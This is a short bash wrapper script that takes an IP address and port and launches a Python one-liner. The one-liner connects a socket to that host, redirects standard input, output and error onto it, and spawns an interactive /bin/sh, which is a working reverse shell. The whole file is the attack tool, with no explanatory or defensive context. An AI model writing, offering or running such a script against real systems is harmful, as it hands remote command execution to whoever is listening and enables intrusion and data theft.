#!/bin/bash

# Check if the correct number of arguments is provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP_ADDRESS> <PORT>"
    exit 1
fi

IP_ADDRESS=$1
PORT=$2

python -c "import socket, subprocess, os; \
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); \
s.connect(('$IP_ADDRESS', $PORT)); \
os.dup2(s.fileno(), 0); \
os.dup2(s.fileno(), 1); \
os.dup2(s.fileno(), 2); \
subprocess.call(['/bin/sh', '-i'])"
